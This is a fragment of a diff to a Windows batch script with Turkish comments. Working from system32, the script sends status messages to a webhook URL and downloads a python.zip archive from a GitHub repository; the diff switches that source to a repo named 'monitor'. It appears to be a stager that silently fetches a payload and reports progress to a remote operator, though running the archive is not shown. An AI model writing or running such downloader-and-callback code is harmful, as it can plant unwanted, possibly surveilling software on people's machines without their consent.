@@ -23,7 +23,7 @@ cd system32
 
 :: Dosyaları indir
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilmeye başladı\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/python.zip' -OutFile 'Python.zip'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/python.zip' -OutFile 'Python.zip'"
 echo Python.zip dosyası indirildi.
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilme bitti\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
 
